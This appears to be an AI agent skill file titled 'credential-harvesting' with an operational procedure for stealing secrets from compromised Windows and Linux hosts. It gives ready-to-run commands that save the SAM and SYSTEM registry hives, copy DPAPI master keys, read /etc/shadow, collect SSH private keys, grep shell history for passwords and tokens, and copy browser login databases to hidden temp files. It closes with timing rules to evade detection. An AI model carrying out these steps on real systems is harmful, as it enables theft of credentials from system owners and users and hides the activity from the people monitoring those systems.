---
name: credential-harvesting
description: Password and hash collection from compromised hosts. Covers credential stores, memory dumps, browser data, and configuration files.
---

# Credential Harvesting

## WARNING: High-Risk Activity
This skill targets sensitive data. Follow OPSEC rules strictly.

## Target Locations

### Windows Credential Stores
```bash
# SAM database (requires SYSTEM)
reg save HKLM\SAM %TEMP%\sam.save
reg save HKLM\SYSTEM %TEMP%\system.save

# Cached credentials
cmdkey /list > %TEMP%\cached_creds.txt 2>&1

# DPAPI master keys
copy C:\Users\%USERNAME%\AppData\Local\Microsoft\Protect\* %TEMP%\dpapi\ 2>nul
```

### Linux Credential Stores
```bash
# Shadow file (requires root)
cat /etc/shadow 2>/dev/null > /tmp/.shadow.txt

# SSH keys
find /home -name "id_rsa" -o "id_dsa" -o "*.pem" 2>/dev/null > /tmp/.ssh_keys.txt

# History files with potential creds
cat ~/.bash_history ~/.history 2>/dev/null | grep -iE "pass|cred|token|api|secret" > /tmp/.hist_creds.txt
```

### Browser Credentials (if accessible)
```bash
# Chrome (Windows)
copy "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data" %TEMP%\chrome_logins.db 2>nul

# Firefox profiles
dir /s /b "C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\*.sqlite" 2>nul > %TEMP%\ff_profiles.txt
```

## Timing Rules
- Wait **120+ seconds** between each credential source access
- Never dump all sources in rapid sequence
- Prioritize based on target value (current session > saved > history)
